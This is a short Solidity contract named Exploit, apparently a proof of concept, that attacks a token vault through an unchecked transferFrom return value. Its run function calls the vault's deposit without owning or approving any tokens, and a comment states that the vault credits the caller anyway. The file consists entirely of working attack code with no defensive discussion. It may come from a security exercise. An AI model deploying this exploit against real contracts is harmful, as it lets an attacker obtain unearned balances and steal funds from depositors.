// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function deposit(uint256 amount) external;
}

contract Exploit {
    address public vault;

    constructor(address target) payable {
        vault = target;
    }

    function run() external {
        // No tokens, no approval: transferFrom returns false, but the vault still credits us.
        try IVault(vault).deposit(1 ether) {} catch {}
    }
}
